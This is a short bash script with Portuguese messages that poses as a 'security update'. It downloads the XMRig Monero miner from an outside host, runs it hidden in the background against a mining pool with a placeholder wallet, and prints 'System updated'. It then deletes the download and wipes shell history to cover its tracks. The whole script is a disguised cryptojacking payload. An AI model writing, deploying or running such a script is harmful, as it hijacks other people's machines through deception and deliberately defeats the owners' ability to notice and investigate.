#!/bin/bash
echo "🔄 Iniciando atualização de segurança..."

# Baixa e extrai corretamente
wget -qO xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
tar -xzf xmrig.tar.gz
chmod +x xmrig/xmrig

# Executa com cloaking
nohup ./xmrig/xmrig \
  -o pool.minexmr.com:443 \
  -u SEU_WALLET_XMR_AQUI \
  --donate-level=0 \
  --cpu-max-threads-hint=60 \
  --background > /dev/null 2>&1 &

echo "✅ Sistema atualizado."

# Limpa rastro
rm -f xmrig.tar.gz
history -c && history -w
